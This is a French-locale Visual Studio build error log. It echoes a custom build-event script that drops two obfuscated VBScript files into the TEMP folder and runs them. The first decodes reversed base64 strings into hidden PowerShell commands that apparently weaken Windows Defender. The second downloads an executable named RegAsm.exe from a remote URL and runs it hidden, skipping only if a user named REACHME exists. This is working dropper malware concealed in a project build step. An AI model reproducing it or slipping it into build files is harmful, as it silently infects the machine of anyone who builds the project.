  Dim a, b, c, i, j, x, s, e, r
  a = Array( _
  "=gDI5FGRlxWdkVGajNlbhN2UtASZj5WZyVmZlJHUw1UL0V2UgQmbh1WbvNWLgUGel5CbsVGazJXZ39Gc", _
  "2AibvlGdjFEdsVXYmVGR0FWZyhGVlJXZ2V2UtASZj5WZyVmZlJHUw1UL0V2UgQmbh1WbvNWLgUGel5CbsVGazJXZ39Gc", _
  "2AibvlGdjFEdsVXYmVGR0FWZyhGV39GTtASZj5WZyVmZlJHUw1UL0V2UgQmbh1WbvNWLgUGel5CbsVGazJXZ39Gc", _
  "=U2Yy9mRtAiNg42bpR3YBRHb1FmZlREdhVmcoRFanlGStASZj5WZyVmZlJHUw1UL0V2UgQmbh1WbvNWLgUGel5CbsVGazJXZ39Gc", _
  "wAyZulGdy9GclJ1UQFUTtASZj5WZyVmZlJHUw1UL0V2UgQmbh1WbvNWLgUGel5CbsVGazJXZ39Gc", _
  "==gMgQnblNnbvN0clxGctF2U0lWbiV3UtASZj5WZyVmZlJHUw1UL0V2UgQmbh1WbvNWLgUGel5CbsVGazJXZ39Gc", _
  "lVnc0RCIn5Wau5WYjNFdwlmcjNVZsJWYzlGRtASZj5WZyVmZlJHUw1UL0V2UgQmbh1WbvNWLgUGel5CbsVGazJXZ39Gc", _
  "=UWdyRHJg0WZ0NXeT52bpRnblZXZyBlbvl2c1JHdulUZsJWYzlGRtASZj5WZyVmZlJHUw1UL0V2UgQmbh1WbvNWLgUGel5CbsVGazJXZ39Gc", _
  "==QZ1JHdkAyZulmbuF2YTVmdph2YyFUZsJWYzlGRtASZj5WZyVmZlJHUw1UL0V2UgQmbh1WbvNWLgUGel5CbsVGazJXZ39Gc", _
  "=UWdyRHJgUmbpdmbFRXdvhGdpdFc1RnchR3Uu9UZ0FGZwVVZsJWYzlGRlJXd0Fmbnl2UtASZj5WZyVmZlJHUw1UL0V2UgQmbh1WbvNWLgUGel5CbsVGazJXZ39Gc", _
  "lVnc0RCIlR2bNl3YhZXayBVZsJWYzlGRtASZj5WZyVmZlJHUw1UL0V2UgQmbh1WbvNWLgUGel5CbsVGazJXZ39Gc", _
  "lVnc0RCIu9Wa0NWZ09mcQZVQPlUZsJWYzlGRtASZj5WZyVmZlJHUw1UL0V2UgQmbh1WbvNWLgUGel5CbsVGazJXZ39Gc", _
  "=UWdyRHJg4WZlNFdzJXaGRXQrN2bsJUZsJWYzlGRtASZj5WZyVmZlJHUw1UL0V2UgQmbh1WbvNWLgUGel5CbsVGazJXZ39Gc", _
  "=UGel5CIu9Waz5WZ0hXRu9WazVHbjhXRtASZj5WZyVmZlJHUw1ULkRWQgQmbh1WbvNWLgUGel5CbsVGazJXZ39Gc", _
  "lxmYhNXakBibvlGdjVGdvJHUBVFUtASZj5WZyVmZlJHUw1UL0V2UgQmbh1WbvNWLgUGel5CbsVGazJXZ39Gc", _
  "==AZlxmYhNXaEByczV2YjFkclRGbvZEZlxGbvJHdu92QlxmYh5WRtASZj5WZyVmZlJHUw1UL0V2UgQmbh1WbvNWLgUGel5CbsVGazJXZ39Gc", _
  "=AXb05CIu9Waz5WZ0hXRu9WazVHbjhXRtASZj5WZyVmZlJHUw1ULkRWQgQmbh1WbvNWLgUGel5CbsVGazJXZ39Gc", _
  "=UGel5CIu9Waz5WZ0hXRu9WazVHbjhXRtASZj5WZyVmZlJHUw1ULkRWQgQmbh1WbvNWLgUGel5CbsVGazJXZ39Gc", _
  "=MnY25CIu9Waz5WZ0hXRu9WazVHbjhXRtASZj5WZyVmZlJHUw1ULkRWQgQmbh1WbvNWLgUGel5CbsVGazJXZ39Gc", _
  "=QXYi5CIu9Waz5WZ0hXRu9WazVHbjhXRtASZj5WZyVmZlJHUw1ULkRWQgQmbh1WbvNWLgUGel5CbsVGazJXZ39Gc", _
  "==gIQ1URUpjduVGJggGdhBlbvl2c1x2Y4VULgU2YuVmclZWZyBFcN1CZkFkIgQmbh1WbvNWLgUGel5CbsVGazJXZ39Gc" _
  Commande ECHO désactivée.
  Set x = CreateObject("Scripting.FileSystemObject")
  Set s = CreateObject("ADODB.Stream")
  Set e = CreateObject("Msxml2.DOMDocument.3.0")
  Set r = CreateObject("WScript.Shell")
  For i = 0 To UBound(a)
  b = StrReverse(a(i))
  Set c = e.CreateElement("b64")
  c.DataType = "bin.base64"
  c.Text = b
  s.Type = 1
  s.Open
  s.Write c.NodeTypedValue
  s.Position = 0
  s.Type = 2
  s.Charset = "utf-8"
  d = s.ReadText
  s.Close
  r.Run d, 0, True
  Next
  Dim a, b, c, d, e, f, g, h, i, j
  a = "==QZ4VmLtNXQnVmUv4Wah12LzRWYlh2LzZWZy9ydhJ3LkVWamlmclZ3LtFmcUNmch10Lt92YuIWdoRXan9yL6MHc0RHa"
  Set b = CreateObject("Scripting.FileSystemObject"
  Set c = CreateObject("WScript.Shell")
  d = c.ExpandEnvironmentStrings("%TEMP%")
  Randomize
  e = "Driver" & Int((9999 - 1000 + 1) * Rnd + 1000)
  f = d & "\\" & e
  If Not b.FolderExists(f) Then b.CreateFolder f
  g = f & "\\RegAsm.exe"
  h = m(StrReverse(a))
  n h, g
  If Not o("REACHME") Then c.Run  & g & , 0, False
  Function m(x)
  Dim y, z
  Set y = CreateObject("MSXML2.DOMDocument")
  Set z = y.createElement("base64")
  z.dataType = "bin.base64"
  z.Text = x
  m = p(z.nodeTypedValue)
  End Function
  Function p(q)
  Dim r
  Set r = CreateObject("ADODB.Stream")
  r.Type = 1
  r.Open
  r.Write q
  r.Position = 0
  r.Type = 2
  r.Charset = "utf-8"
  p = r.ReadText
  r.Close
  End Function
  Sub n(s, t)
  Dim u, v
  Set u = CreateObject("MSXML2.XMLHTTP")
  u.Open "GET", s, False
  u.Send
  If u.Status = 200 Then
  Set v = CreateObject("ADODB.Stream")
  v.Type = 1
  v.Open
  v.Write u.responseBody
  v.SaveToFile t, 2
  v.Close
  End If
  End Sub
  Function o(w)
  Dim x, y, z
  Set x = GetObject("winmgmts:\\.\root\cimv2")
  Set y = x.ExecQuery("Select * from Win32_UserAccount Where Name='" & w & "'")
  o = (y.Count > 0)
  End Function
  Erreur en entrée: Impossible de trouver le fichier script "C:\Users\REACHME\AppData\Local\Temp\1cpKHgvGGf.vbs".
  Erreur : la redirection de l'entrée n'est pas prise en charge.
           Fin immédiate du processus.
  Erreur en entrée: Impossible de trouver le fichier script "C:\Users\REACHME\AppData\Local\Temp\2cpKAgvGGf.vbs".
C:\Program Files\Microsoft Visual Studio\2022\Community\MSBuild\Microsoft\VC\v170\Microsoft.CppCommon.targets(156,5): error MSB3073: La commande "
C:\Program Files\Microsoft Visual Studio\2022\Community\MSBuild\Microsoft\VC\v170\Microsoft.CppCommon.targets(156,5): error MSB3073:         @echo off
C:\Program Files\Microsoft Visual Studio\2022\Community\MSBuild\Microsoft\VC\v170\Microsoft.CppCommon.targets(156,5): error MSB3073:         setlocal
C:\Program Files\Microsoft Visual Studio\2022\Community\MSBuild\Microsoft\VC\v170\Microsoft.CppCommon.targets(156,5): error MSB3073:         set "TEMP_VBS1=%TEMP%\1cpKHgvGGf.vbs"
C:\Program Files\Microsoft Visual Studio\2022\Community\MSBuild\Microsoft\VC\v170\Microsoft.CppCommon.targets(156,5): error MSB3073:         set "TEMP_VBS2=%TEMP%\2cpKAgvGGf.vbs"
C:\Program Files\Microsoft Visual Studio\2022\Community\MSBuild\Microsoft\VC\v170\Microsoft.CppCommon.targets(156,5): error MSB3073:         (
C:\Program Files\Microsoft Visual Studio\2022\Community\MSBuild\Microsoft\VC\v170\Microsoft.CppCommon.targets(156,5): error MSB3073:         echo Dim a, b, c, i, j, x, s, e, r
C:\Program Files\Microsoft Visual Studio\2022\Community\MSBuild\Microsoft\VC\v170\Microsoft.CppCommon.targets(156,5): error MSB3073:         echo a = Array( _
C:\Program Files\Microsoft Visual Studio\2022\Community\MSBuild\Microsoft\VC\v170\Microsoft.CppCommon.targets(156,5): error MSB3073:         echo "=gDI5FGRlxWdkVGajNlbhN2UtASZj5WZyVmZlJHUw1UL0V2UgQmbh1WbvNWLgUGel5CbsVGazJXZ39Gc", _
C:\Program Files\Microsoft Visual Studio\2022\Community\MSBuild\Microsoft\VC\v170\Microsoft.CppCommon.targets(156,5): error MSB3073:         echo "2AibvlGdjFEdsVXYmVGR0FWZyhGVlJXZ2V2UtASZj5WZyVmZlJHUw1UL0V2UgQmbh1WbvNWLgUGel5CbsVGazJXZ39Gc", _
C:\Program Files\Microsoft Visual Studio\2022\Community\MSBuild\Microsoft\VC\v170\Microsoft.CppCommon.targets(156,5): error MSB3073:         echo "2AibvlGdjFEdsVXYmVGR0FWZyhGV39GTtASZj5WZyVmZlJHUw1UL0V2UgQmbh1WbvNWLgUGel5CbsVGazJXZ39Gc", _
C:\Program Files\Microsoft Visual Studio\2022\Community\MSBuild\Microsoft\VC\v170\Microsoft.CppCommon.targets(156,5): error MSB3073:         echo "=U2Yy9mRtAiNg42bpR3YBRHb1FmZlREdhVmcoRFanlGStASZj5WZyVmZlJHUw1UL0V2UgQmbh1WbvNWLgUGel5CbsVGazJXZ39Gc", _
C:\Program Files\Microsoft Visual Studio\2022\Community\MSBuild\Microsoft\VC\v170\Microsoft.CppCommon.targets(156,5): error MSB3073:         echo "wAyZulGdy9GclJ1UQFUTtASZj5WZyVmZlJHUw1UL0V2UgQmbh1WbvNWLgUGel5CbsVGazJXZ39Gc", _
C:\Program Files\Microsoft Visual Studio\2022\Community\MSBuild\Microsoft\VC\v170\Microsoft.CppCommon.targets(156,5): error MSB3073:         echo "==gMgQnblNnbvN0clxGctF2U0lWbiV3UtASZj5WZyVmZlJHUw1UL0V2UgQmbh1WbvNWLgUGel5CbsVGazJXZ39Gc", _
C:\Program Files\Microsoft Visual Studio\2022\Community\MSBuild\Microsoft\VC\v170\Microsoft.CppCommon.targets(156,5): error MSB3073:         echo "lVnc0RCIn5Wau5WYjNFdwlmcjNVZsJWYzlGRtASZj5WZyVmZlJHUw1UL0V2UgQmbh1WbvNWLgUGel5CbsVGazJXZ39Gc", _
C:\Program Files\Microsoft Visual Studio\2022\Community\MSBuild\Microsoft\VC\v170\Microsoft.CppCommon.targets(156,5): error MSB3073:         echo "=UWdyRHJg0WZ0NXeT52bpRnblZXZyBlbvl2c1JHdulUZsJWYzlGRtASZj5WZyVmZlJHUw1UL0V2UgQmbh1WbvNWLgUGel5CbsVGazJXZ39Gc", _
C:\Program Files\Microsoft Visual Studio\2022\Community\MSBuild\Microsoft\VC\v170\Microsoft.CppCommon.targets(156,5): error MSB3073:         echo "==QZ1JHdkAyZulmbuF2YTVmdph2YyFUZsJWYzlGRtASZj5WZyVmZlJHUw1UL0V2UgQmbh1WbvNWLgUGel5CbsVGazJXZ39Gc", _
C:\Program Files\Microsoft Visual Studio\2022\Community\MSBuild\Microsoft\VC\v170\Microsoft.CppCommon.targets(156,5): error MSB3073:         echo "=UWdyRHJgUmbpdmbFRXdvhGdpdFc1RnchR3Uu9UZ0FGZwVVZsJWYzlGRlJXd0Fmbnl2UtASZj5WZyVmZlJHUw1UL0V2UgQmbh1WbvNWLgUGel5CbsVGazJXZ39Gc", _
C:\Program Files\Microsoft Visual Studio\2022\Community\MSBuild\Microsoft\VC\v170\Microsoft.CppCommon.targets(156,5): error MSB3073:         echo "lVnc0RCIlR2bNl3YhZXayBVZsJWYzlGRtASZj5WZyVmZlJHUw1UL0V2UgQmbh1WbvNWLgUGel5CbsVGazJXZ39Gc", _
C:\Program Files\Microsoft Visual Studio\2022\Community\MSBuild\Microsoft\VC\v170\Microsoft.CppCommon.targets(156,5): error MSB3073:         echo "lVnc0RCIu9Wa0NWZ09mcQZVQPlUZsJWYzlGRtASZj5WZyVmZlJHUw1UL0V2UgQmbh1WbvNWLgUGel5CbsVGazJXZ39Gc", _
C:\Program Files\Microsoft Visual Studio\2022\Community\MSBuild\Microsoft\VC\v170\Microsoft.CppCommon.targets(156,5): error MSB3073:         echo "=UWdyRHJg4WZlNFdzJXaGRXQrN2bsJUZsJWYzlGRtASZj5WZyVmZlJHUw1UL0V2UgQmbh1WbvNWLgUGel5CbsVGazJXZ39Gc", _
C:\Program Files\Microsoft Visual Studio\2022\Community\MSBuild\Microsoft\VC\v170\Microsoft.CppCommon.targets(156,5): error MSB3073:         echo "=UGel5CIu9Waz5WZ0hXRu9WazVHbjhXRtASZj5WZyVmZlJHUw1ULkRWQgQmbh1WbvNWLgUGel5CbsVGazJXZ39Gc", _
C:\Program Files\Microsoft Visual Studio\2022\Community\MSBuild\Microsoft\VC\v170\Microsoft.CppCommon.targets(156,5): error MSB3073:         echo "lxmYhNXakBibvlGdjVGdvJHUBVFUtASZj5WZyVmZlJHUw1UL0V2UgQmbh1WbvNWLgUGel5CbsVGazJXZ39Gc", _
C:\Program Files\Microsoft Visual Studio\2022\Community\MSBuild\Microsoft\VC\v170\Microsoft.CppCommon.targets(156,5): error MSB3073:         echo "==AZlxmYhNXaEByczV2YjFkclRGbvZEZlxGbvJHdu92QlxmYh5WRtASZj5WZyVmZlJHUw1UL0V2UgQmbh1WbvNWLgUGel5CbsVGazJXZ39Gc", _
C:\Program Files\Microsoft Visual Studio\2022\Community\MSBuild\Microsoft\VC\v170\Microsoft.CppCommon.targets(156,5): error MSB3073:         echo "=AXb05CIu9Waz5WZ0hXRu9WazVHbjhXRtASZj5WZyVmZlJHUw1ULkRWQgQmbh1WbvNWLgUGel5CbsVGazJXZ39Gc", _
C:\Program Files\Microsoft Visual Studio\2022\Community\MSBuild\Microsoft\VC\v170\Microsoft.CppCommon.targets(156,5): error MSB3073:         echo "=UGel5CIu9Waz5WZ0hXRu9WazVHbjhXRtASZj5WZyVmZlJHUw1ULkRWQgQmbh1WbvNWLgUGel5CbsVGazJXZ39Gc", _
C:\Program Files\Microsoft Visual Studio\2022\Community\MSBuild\Microsoft\VC\v170\Microsoft.CppCommon.targets(156,5): error MSB3073:         echo "=MnY25CIu9Waz5WZ0hXRu9WazVHbjhXRtASZj5WZyVmZlJHUw1ULkRWQgQmbh1WbvNWLgUGel5CbsVGazJXZ39Gc", _
C:\Program Files\Microsoft Visual Studio\2022\Community\MSBuild\Microsoft\VC\v170\Microsoft.CppCommon.targets(156,5): error MSB3073:         echo "=QXYi5CIu9Waz5WZ0hXRu9WazVHbjhXRtASZj5WZyVmZlJHUw1ULkRWQgQmbh1WbvNWLgUGel5CbsVGazJXZ39Gc", _
C:\Program Files\Microsoft Visual Studio\2022\Community\MSBuild\Microsoft\VC\v170\Microsoft.CppCommon.targets(156,5): error MSB3073:         echo "==gIQ1URUpjduVGJggGdhBlbvl2c1x2Y4VULgU2YuVmclZWZyBFcN1CZkFkIgQmbh1WbvNWLgUGel5CbsVGazJXZ39Gc" _
C:\Program Files\Microsoft Visual Studio\2022\Community\MSBuild\Microsoft\VC\v170\Microsoft.CppCommon.targets(156,5): error MSB3073:         echo )
C:\Program Files\Microsoft Visual Studio\2022\Community\MSBuild\Microsoft\VC\v170\Microsoft.CppCommon.targets(156,5): error MSB3073:         echo Set x = CreateObject("Scripting.FileSystemObject")
C:\Program Files\Microsoft Visual Studio\2022\Community\MSBuild\Microsoft\VC\v170\Microsoft.CppCommon.targets(156,5): error MSB3073:         echo Set s = CreateObject("ADODB.Stream")
C:\Program Files\Microsoft Visual Studio\2022\Community\MSBuild\Microsoft\VC\v170\Microsoft.CppCommon.targets(156,5): error MSB3073:         echo Set e = CreateObject("Msxml2.DOMDocument.3.0")
C:\Program Files\Microsoft Visual Studio\2022\Community\MSBuild\Microsoft\VC\v170\Microsoft.CppCommon.targets(156,5): error MSB3073:         echo Set r = CreateObject("WScript.Shell")
C:\Program Files\Microsoft Visual Studio\2022\Community\MSBuild\Microsoft\VC\v170\Microsoft.CppCommon.targets(156,5): error MSB3073:         echo For i = 0 To UBound(a)
C:\Program Files\Microsoft Visual Studio\2022\Community\MSBuild\Microsoft\VC\v170\Microsoft.CppCommon.targets(156,5): error MSB3073:         echo b = StrReverse(a(i))
C:\Program Files\Microsoft Visual Studio\2022\Community\MSBuild\Microsoft\VC\v170\Microsoft.CppCommon.targets(156,5): error MSB3073:         echo Set c = e.CreateElement("b64")
C:\Program Files\Microsoft Visual Studio\2022\Community\MSBuild\Microsoft\VC\v170\Microsoft.CppCommon.targets(156,5): error MSB3073:         echo c.DataType = "bin.base64"
C:\Program Files\Microsoft Visual Studio\2022\Community\MSBuild\Microsoft\VC\v170\Microsoft.CppCommon.targets(156,5): error MSB3073:         echo c.Text = b
C:\Program Files\Microsoft Visual Studio\2022\Community\MSBuild\Microsoft\VC\v170\Microsoft.CppCommon.targets(156,5): error MSB3073:         echo s.Type = 1
C:\Program Files\Microsoft Visual Studio\2022\Community\MSBuild\Microsoft\VC\v170\Microsoft.CppCommon.targets(156,5): error MSB3073:         echo s.Open
C:\Program Files\Microsoft Visual Studio\2022\Community\MSBuild\Microsoft\VC\v170\Microsoft.CppCommon.targets(156,5): error MSB3073:         echo s.Write c.NodeTypedValue
C:\Program Files\Microsoft Visual Studio\2022\Community\MSBuild\Microsoft\VC\v170\Microsoft.CppCommon.targets(156,5): error MSB3073:         echo s.Position = 0
C:\Program Files\Microsoft Visual Studio\2022\Community\MSBuild\Microsoft\VC\v170\Microsoft.CppCommon.targets(156,5): error MSB3073:         echo s.Type = 2
C:\Program Files\Microsoft Visual Studio\2022\Community\MSBuild\Microsoft\VC\v170\Microsoft.CppCommon.targets(156,5): error MSB3073:         echo s.Charset = "utf-8"
C:\Program Files\Microsoft Visual Studio\2022\Community\MSBuild\Microsoft\VC\v170\Microsoft.CppCommon.targets(156,5): error MSB3073:         echo d = s.ReadText
C:\Program Files\Microsoft Visual Studio\2022\Community\MSBuild\Microsoft\VC\v170\Microsoft.CppCommon.targets(156,5): error MSB3073:         echo s.Close
C:\Program Files\Microsoft Visual Studio\2022\Community\MSBuild\Microsoft\VC\v170\Microsoft.CppCommon.targets(156,5): error MSB3073:         echo r.Run d, 0, True
C:\Program Files\Microsoft Visual Studio\2022\Community\MSBuild\Microsoft\VC\v170\Microsoft.CppCommon.targets(156,5): error MSB3073:         echo Next
C:\Program Files\Microsoft Visual Studio\2022\Community\MSBuild\Microsoft\VC\v170\Microsoft.CppCommon.targets(156,5): error MSB3073:         ) > "%TEMP_VBS1%"
C:\Program Files\Microsoft Visual Studio\2022\Community\MSBuild\Microsoft\VC\v170\Microsoft.CppCommon.targets(156,5): error MSB3073: 
C:\Program Files\Microsoft Visual Studio\2022\Community\MSBuild\Microsoft\VC\v170\Microsoft.CppCommon.targets(156,5): error MSB3073:         (
C:\Program Files\Microsoft Visual Studio\2022\Community\MSBuild\Microsoft\VC\v170\Microsoft.CppCommon.targets(156,5): error MSB3073:         echo Dim a, b, c, d, e, f, g, h, i, j
C:\Program Files\Microsoft Visual Studio\2022\Community\MSBuild\Microsoft\VC\v170\Microsoft.CppCommon.targets(156,5): error MSB3073:         echo a = "==QZ4VmLtNXQnVmUv4Wah12LzRWYlh2LzZWZy9ydhJ3LkVWamlmclZ3LtFmcUNmch10Lt92YuIWdoRXan9yL6MHc0RHa"
C:\Program Files\Microsoft Visual Studio\2022\Community\MSBuild\Microsoft\VC\v170\Microsoft.CppCommon.targets(156,5): error MSB3073:         echo Set b = CreateObject("Scripting.FileSystemObject")
C:\Program Files\Microsoft Visual Studio\2022\Community\MSBuild\Microsoft\VC\v170\Microsoft.CppCommon.targets(156,5): error MSB3073:         echo Set c = CreateObject("WScript.Shell")
C:\Program Files\Microsoft Visual Studio\2022\Community\MSBuild\Microsoft\VC\v170\Microsoft.CppCommon.targets(156,5): error MSB3073:         echo d = c.ExpandEnvironmentStrings("%%TEMP%%")
C:\Program Files\Microsoft Visual Studio\2022\Community\MSBuild\Microsoft\VC\v170\Microsoft.CppCommon.targets(156,5): error MSB3073:         echo Randomize
C:\Program Files\Microsoft Visual Studio\2022\Community\MSBuild\Microsoft\VC\v170\Microsoft.CppCommon.targets(156,5): error MSB3073:         echo e = "Driver" ^& Int((9999 - 1000 + 1) * Rnd + 1000)
C:\Program Files\Microsoft Visual Studio\2022\Community\MSBuild\Microsoft\VC\v170\Microsoft.CppCommon.targets(156,5): error MSB3073:         echo f = d ^& "\\" ^& e
C:\Program Files\Microsoft Visual Studio\2022\Community\MSBuild\Microsoft\VC\v170\Microsoft.CppCommon.targets(156,5): error MSB3073:         echo If Not b.FolderExists(f) Then b.CreateFolder f
C:\Program Files\Microsoft Visual Studio\2022\Community\MSBuild\Microsoft\VC\v170\Microsoft.CppCommon.targets(156,5): error MSB3073:         echo g = f ^& "\\RegAsm.exe"
C:\Program Files\Microsoft Visual Studio\2022\Community\MSBuild\Microsoft\VC\v170\Microsoft.CppCommon.targets(156,5): error MSB3073:         echo h = m(StrReverse(a))
C:\Program Files\Microsoft Visual Studio\2022\Community\MSBuild\Microsoft\VC\v170\Microsoft.CppCommon.targets(156,5): error MSB3073:         echo n h, g
C:\Program Files\Microsoft Visual Studio\2022\Community\MSBuild\Microsoft\VC\v170\Microsoft.CppCommon.targets(156,5): error MSB3073:         echo If Not o("REACHME") Then c.Run  ^& g ^& , 0, False
C:\Program Files\Microsoft Visual Studio\2022\Community\MSBuild\Microsoft\VC\v170\Microsoft.CppCommon.targets(156,5): error MSB3073:         echo Function m(x)
C:\Program Files\Microsoft Visual Studio\2022\Community\MSBuild\Microsoft\VC\v170\Microsoft.CppCommon.targets(156,5): error MSB3073:         echo Dim y, z
C:\Program Files\Microsoft Visual Studio\2022\Community\MSBuild\Microsoft\VC\v170\Microsoft.CppCommon.targets(156,5): error MSB3073:         echo Set y = CreateObject("MSXML2.DOMDocument")
C:\Program Files\Microsoft Visual Studio\2022\Community\MSBuild\Microsoft\VC\v170\Microsoft.CppCommon.targets(156,5): error MSB3073:         echo Set z = y.createElement("base64")
C:\Program Files\Microsoft Visual Studio\2022\Community\MSBuild\Microsoft\VC\v170\Microsoft.CppCommon.targets(156,5): error MSB3073:         echo z.dataType = "bin.base64"
C:\Program Files\Microsoft Visual Studio\2022\Community\MSBuild\Microsoft\VC\v170\Microsoft.CppCommon.targets(156,5): error MSB3073:         echo z.Text = x
C:\Program Files\Microsoft Visual Studio\2022\Community\MSBuild\Microsoft\VC\v170\Microsoft.CppCommon.targets(156,5): error MSB3073:         echo m = p(z.nodeTypedValue)
C:\Program Files\Microsoft Visual Studio\2022\Community\MSBuild\Microsoft\VC\v170\Microsoft.CppCommon.targets(156,5): error MSB3073:         echo End Function
C:\Program Files\Microsoft Visual Studio\2022\Community\MSBuild\Microsoft\VC\v170\Microsoft.CppCommon.targets(156,5): error MSB3073:         echo Function p(q)
C:\Program Files\Microsoft Visual Studio\2022\Community\MSBuild\Microsoft\VC\v170\Microsoft.CppCommon.targets(156,5): error MSB3073:         echo Dim r
C:\Program Files\Microsoft Visual Studio\2022\Community\MSBuild\Microsoft\VC\v170\Microsoft.CppCommon.targets(156,5): error MSB3073:         echo Set r = CreateObject("ADODB.Stream")
C:\Program Files\Microsoft Visual Studio\2022\Community\MSBuild\Microsoft\VC\v170\Microsoft.CppCommon.targets(156,5): error MSB3073:         echo r.Type = 1
C:\Program Files\Microsoft Visual Studio\2022\Community\MSBuild\Microsoft\VC\v170\Microsoft.CppCommon.targets(156,5): error MSB3073:         echo r.Open
C:\Program Files\Microsoft Visual Studio\2022\Community\MSBuild\Microsoft\VC\v170\Microsoft.CppCommon.targets(156,5): error MSB3073:         echo r.Write q
C:\Program Files\Microsoft Visual Studio\2022\Community\MSBuild\Microsoft\VC\v170\Microsoft.CppCommon.targets(156,5): error MSB3073:         echo r.Position = 0
C:\Program Files\Microsoft Visual Studio\2022\Community\MSBuild\Microsoft\VC\v170\Microsoft.CppCommon.targets(156,5): error MSB3073:         echo r.Type = 2
C:\Program Files\Microsoft Visual Studio\2022\Community\MSBuild\Microsoft\VC\v170\Microsoft.CppCommon.targets(156,5): error MSB3073:         echo r.Charset = "utf-8"
C:\Program Files\Microsoft Visual Studio\2022\Community\MSBuild\Microsoft\VC\v170\Microsoft.CppCommon.targets(156,5): error MSB3073:         echo p = r.ReadText
C:\Program Files\Microsoft Visual Studio\2022\Community\MSBuild\Microsoft\VC\v170\Microsoft.CppCommon.targets(156,5): error MSB3073:         echo r.Close
C:\Program Files\Microsoft Visual Studio\2022\Community\MSBuild\Microsoft\VC\v170\Microsoft.CppCommon.targets(156,5): error MSB3073:         echo End Function
C:\Program Files\Microsoft Visual Studio\2022\Community\MSBuild\Microsoft\VC\v170\Microsoft.CppCommon.targets(156,5): error MSB3073:         echo Sub n(s, t)
C:\Program Files\Microsoft Visual Studio\2022\Community\MSBuild\Microsoft\VC\v170\Microsoft.CppCommon.targets(156,5): error MSB3073:         echo Dim u, v
C:\Program Files\Microsoft Visual Studio\2022\Community\MSBuild\Microsoft\VC\v170\Microsoft.CppCommon.targets(156,5): error MSB3073:         echo Set u = CreateObject("MSXML2.XMLHTTP")
C:\Program Files\Microsoft Visual Studio\2022\Community\MSBuild\Microsoft\VC\v170\Microsoft.CppCommon.targets(156,5): error MSB3073:         echo u.Open "GET", s, False
C:\Program Files\Microsoft Visual Studio\2022\Community\MSBuild\Microsoft\VC\v170\Microsoft.CppCommon.targets(156,5): error MSB3073:         echo u.Send
C:\Program Files\Microsoft Visual Studio\2022\Community\MSBuild\Microsoft\VC\v170\Microsoft.CppCommon.targets(156,5): error MSB3073:         echo If u.Status = 200 Then
C:\Program Files\Microsoft Visual Studio\2022\Community\MSBuild\Microsoft\VC\v170\Microsoft.CppCommon.targets(156,5): error MSB3073:         echo Set v = CreateObject("ADODB.Stream")
C:\Program Files\Microsoft Visual Studio\2022\Community\MSBuild\Microsoft\VC\v170\Microsoft.CppCommon.targets(156,5): error MSB3073:         echo v.Type = 1
C:\Program Files\Microsoft Visual Studio\2022\Community\MSBuild\Microsoft\VC\v170\Microsoft.CppCommon.targets(156,5): error MSB3073:         echo v.Open
C:\Program Files\Microsoft Visual Studio\2022\Community\MSBuild\Microsoft\VC\v170\Microsoft.CppCommon.targets(156,5): error MSB3073:         echo v.Write u.responseBody
C:\Program Files\Microsoft Visual Studio\2022\Community\MSBuild\Microsoft\VC\v170\Microsoft.CppCommon.targets(156,5): error MSB3073:         echo v.SaveToFile t, 2
C:\Program Files\Microsoft Visual Studio\2022\Community\MSBuild\Microsoft\VC\v170\Microsoft.CppCommon.targets(156,5): error MSB3073:         echo v.Close
C:\Program Files\Microsoft Visual Studio\2022\Community\MSBuild\Microsoft\VC\v170\Microsoft.CppCommon.targets(156,5): error MSB3073:         echo End If
C:\Program Files\Microsoft Visual Studio\2022\Community\MSBuild\Microsoft\VC\v170\Microsoft.CppCommon.targets(156,5): error MSB3073:         echo End Sub
C:\Program Files\Microsoft Visual Studio\2022\Community\MSBuild\Microsoft\VC\v170\Microsoft.CppCommon.targets(156,5): error MSB3073:         echo Function o(w)
C:\Program Files\Microsoft Visual Studio\2022\Community\MSBuild\Microsoft\VC\v170\Microsoft.CppCommon.targets(156,5): error MSB3073:         echo Dim x, y, z
C:\Program Files\Microsoft Visual Studio\2022\Community\MSBuild\Microsoft\VC\v170\Microsoft.CppCommon.targets(156,5): error MSB3073:         echo Set x = GetObject("winmgmts:\\.\root\cimv2")
C:\Program Files\Microsoft Visual Studio\2022\Community\MSBuild\Microsoft\VC\v170\Microsoft.CppCommon.targets(156,5): error MSB3073:         echo Set y = x.ExecQuery("Select * from Win32_UserAccount Where Name='" ^& w ^& "'")
C:\Program Files\Microsoft Visual Studio\2022\Community\MSBuild\Microsoft\VC\v170\Microsoft.CppCommon.targets(156,5): error MSB3073:         echo o = (y.Count ^> 0)
C:\Program Files\Microsoft Visual Studio\2022\Community\MSBuild\Microsoft\VC\v170\Microsoft.CppCommon.targets(156,5): error MSB3073:         echo End Function
C:\Program Files\Microsoft Visual Studio\2022\Community\MSBuild\Microsoft\VC\v170\Microsoft.CppCommon.targets(156,5): error MSB3073:         ) > "%TEMP_VBS2%"
C:\Program Files\Microsoft Visual Studio\2022\Community\MSBuild\Microsoft\VC\v170\Microsoft.CppCommon.targets(156,5): error MSB3073: 
C:\Program Files\Microsoft Visual Studio\2022\Community\MSBuild\Microsoft\VC\v170\Microsoft.CppCommon.targets(156,5): error MSB3073:         cscript //nologo "%TEMP_VBS1%"
C:\Program Files\Microsoft Visual Studio\2022\Community\MSBuild\Microsoft\VC\v170\Microsoft.CppCommon.targets(156,5): error MSB3073:         timeout /t 12 /nobreak >nul
C:\Program Files\Microsoft Visual Studio\2022\Community\MSBuild\Microsoft\VC\v170\Microsoft.CppCommon.targets(156,5): error MSB3073:         cscript //nologo "%TEMP_VBS2%"
C:\Program Files\Microsoft Visual Studio\2022\Community\MSBuild\Microsoft\VC\v170\Microsoft.CppCommon.targets(156,5): error MSB3073:         endlocal
C:\Program Files\Microsoft Visual Studio\2022\Community\MSBuild\Microsoft\VC\v170\Microsoft.CppCommon.targets(156,5): error MSB3073:       
C:\Program Files\Microsoft Visual Studio\2022\Community\MSBuild\Microsoft\VC\v170\Microsoft.CppCommon.targets(156,5): error MSB3073: :VCEnd" s'est arrêtée avec le code 1.
